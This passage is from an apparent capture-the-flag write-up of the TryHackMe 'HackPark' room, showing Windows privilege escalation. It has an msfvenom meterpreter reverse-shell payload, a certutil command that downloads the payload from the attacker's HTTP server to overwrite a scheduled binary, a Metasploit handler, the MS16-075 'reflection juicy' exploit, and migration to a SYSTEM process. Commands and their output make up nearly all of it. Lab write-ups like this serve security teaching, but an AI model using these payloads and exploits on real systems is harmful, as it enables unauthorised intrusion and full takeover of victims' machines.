Message.exe Everyone:(I)(M)
            NT AUTHORITY\SYSTEM:(I)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Users:(I)(RX)
            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
{% endraw %}

<br />
Generate another msfvenom meterpreter payload, with a different port than our first payload.  Call the new binary Message.exe.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4445 -f exe -o Message.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: Message.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Set a handler.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4445
lport => 4445
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4445
```
{% endraw %}

<br />
Transfer the binary to the victim machine.  Overwrite the existing Message.exe binary.

{% raw %}
```bash
C:\Program Files (x86)\SystemScheduler>certutil.exe -urlcache -f http://10.4.119.29:8000/Message.exe Message.exe
certutil.exe -urlcache -f http://10.4.119.29:8000/Message.exe Message.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Check the handler and catch the session.

{% raw %}
```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4445 
[*] Sending stage (203846 bytes) to 10.10.32.1
[*] Meterpreter session 1 opened (10.4.119.29:4445 -> 10.10.32.1:49235) at 2025-03-23 22:27:59 +1100

meterpreter >
```
{% endraw %}

<br />
Check the uid to ensure that we are Administrator.

{% raw %}
```bash
meterpreter > getuid
Server username: HACKPARK\Administrator
```
{% endraw %}

<br />
Another way to elevate if you want to know, is local_exploit_suggester.  Background the session and give it a run.

{% raw %}
```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.60.15 - Collecting local exploits for x86/windows...
[*] 10.10.60.15 - 203 exploit checks are being tried...
[+] 10.10.60.15 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.60.15 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.60.15 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.60.15 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.60.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.60.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.60.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.60.15 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.60.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

 <snip>
```
{% endraw %}

<br />
Choose the reflection juicy exploit from the list.  Execute it.

{% raw %}
```bash
msf6 exploit(windows/local/ms16_075_reflection) > use exploit/windows/local/ms16_075_reflection_juicy 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set session 1
session => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4444 
[+] Target appears to be vulnerable (Windows Server 2012 R2)
[*] Launching notepad to host the exploit...
[+] Process 948 launched.
[*] Reflectively injecting the exploit DLL into 948...
[*] Injecting exploit into 948...
[*] Exploit injected. Injecting exploit configuration into 948...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.60.15
[*] Meterpreter session 2 opened (10.4.119.29:4444 -> 10.10.60.15:49307) at 2025-02-26 15:57:20 +1100

<snip>
```
{% endraw %}

<br />
Migrate to a process that is owned by SYSTEM.

{% raw %}
```bash
meterpreter > migrate 1156
[*] Migrating from 3216 to 1156...
[*] Migration completed successfully.
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
C:\Users\jeff\Desktop>type user.txt
type user.txt
<redacted>
C:\Users\jeff\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::582a:4dfb:a599:e2b8%14
   IPv4 Address. . . . . . . . . . . : 10.10.60.15
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
C:\Users\jeff\Desktop>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
<redacted>
C:\Users\jeff\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::582a:4dfb:a599:e2b8%14
   IPv4 Address. . . . . . . . . . . : 10.10.60.15
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Looks like we were able to smackdown the Dancing Clown in the HackPark.  Hopefully, you enjoyed the read.  See you in the next one.